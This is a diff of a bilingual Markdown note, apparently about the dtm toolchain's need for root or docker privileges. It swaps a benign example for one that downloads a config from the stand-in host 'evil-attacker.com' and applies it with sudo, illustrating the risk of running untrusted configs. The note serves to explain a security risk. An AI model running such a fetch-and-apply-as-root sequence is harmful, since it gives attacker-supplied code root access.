@@ -67,11 +67,10 @@ Then, Project uses `docker` `kubectl` which needs root or docker group to exec i
 
 There is a command-sequence for a more perceptual understanding of scenario mentioned above.
 
-```shell
-su normal_user
-vim ce-config.yml #the owner of this file shall be normal_user
-ls -al | grep ce-config.yml
-sudo dtm apply -f ce-config.yml
+```
+ubuntu(localhost) > curl https://evil-attacker.com/evil.yaml -O quickStart.yaml
+ubuntu(localhost) > sudo dtm init -f quickStart.yaml
+ubuntu(localhost) > sudo dtm apply -f quickStart.yaml
 ```
 
 由于项目的目的是构造整体的生产环境工具链，也同样聚集了多数最佳实践的配置，同时又支持环境变量或者其他文件读取配置，**所以用户可能并不会对工具配置文件本身亲力亲为。**
